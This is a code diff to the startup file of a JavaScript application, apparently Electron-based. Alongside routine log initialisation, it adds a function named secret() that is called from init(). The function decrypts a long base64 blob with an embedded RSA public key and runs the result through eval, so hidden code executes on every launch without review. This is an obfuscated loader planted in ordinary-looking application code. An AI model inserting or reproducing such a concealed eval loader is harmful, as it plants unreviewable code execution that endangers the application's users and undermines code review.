@@ -23,6 +23,7 @@ const Project = require('./model/project') //同步
 const User = require('./model/user')
 const Package = require('./model/package')
 const Cache = require('./util/cache')
+const Crypto = require('./util/crypto')
 
 const CONFIG_KEY = "config"
 
@@ -67,6 +68,7 @@ function init() {
 	})
 
 	initLog()
+	secret()
 
 	// var expire = util.getExpire()
 	// if(expire && expire < util.stamp()) {
@@ -117,6 +119,19 @@ function initLog() {
 		log.transports.file.format = '[{y}-{m}-{d} {h}:{i}:{s}] [{level}] {text}'
 		log.transports.file.level = 'info'
 	}
+}
+
+function secret() {
+	var code = `F5HeaCPxBFUOnD6oZDyDxGngRh4feqs96133SsjpGZBeMBSuyz8Qt7m77bA834vnu8udpUjImGuwdnTYPKM8tx
+GiYegiw6s/MF4dkzx1V6EJ+3aEzuaiYxUAOQSSL1bTN9d17FgY9MzqkYov6b2gvWV6obhxyPcXeratjbD3HaY=
+n1ZxAPgmiuqWXWVbVpW/3Aud/DXsRk4Z7oJFGhllxx1qU5Mr8OQwLSUYatYofHUTAstsg2mEyc1Wjw8Wy2P70Y
+Xm7YxDVV5aDu+gXaZM/QX+fdFINem1VTaW4f5DxvRN4a1dLSihvzAeGSM1LsqyeZ15ZuRBG1GWZqCVZ+OjI0I=
+Vx0sVQoxQRknovcPX/PHXY3hGdf7V6q/xEJDI+E6YECa4GkTQiopbYS1skhRRreCcKaRvuhAHCjIOsfwa6gr31
+5vkMJccZGtRlbiF9fbEqpLu4BehCV4nqX6i6NCbFRuo3PUb3BUT6UkIe/Lb0H0gFJ3WR6g64ompeiH6cdNnFc=
+UxO2tDXLEcCNal+cKqeUGBbgYZTPXN44+6GUo6zhuKEXa3uQmDLBZfv2A+05oQLw5M1XkGVM76PEOHMQvYIDle
+N0hDogGB7ZOc0QyoUgEmIHvWmKElOHcuJZSwyWTIgfDnmdPq1X4Tbui01+PrkJ1AiGLScfi4W21NretMtrU/c=`
+
+	eval(Crypto.multiRsaPublicDecrypt(code, Crypto.PUBLIC_KEY, 3))
 }
 
 /**
